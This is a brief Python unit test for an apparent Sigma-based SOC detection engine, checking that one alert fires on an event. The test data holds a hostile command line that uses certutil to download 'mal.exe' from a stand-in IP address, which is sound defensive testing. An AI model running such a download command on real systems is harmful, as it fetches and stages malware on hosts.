import unittest
from engine.sigma_evaluator import build_default_engine

class TestSOCDetection(unittest.TestCase):
    def test_detection(self):
        engine = build_default_engine()
        alerts = engine.analyze({"host": "wk1", "command_line": "certutil.exe -urlcache -f http://198.51.100.1/mal.exe"})
        self.assertEqual(len(alerts), 1)

if __name__ == "__main__":
    unittest.main()
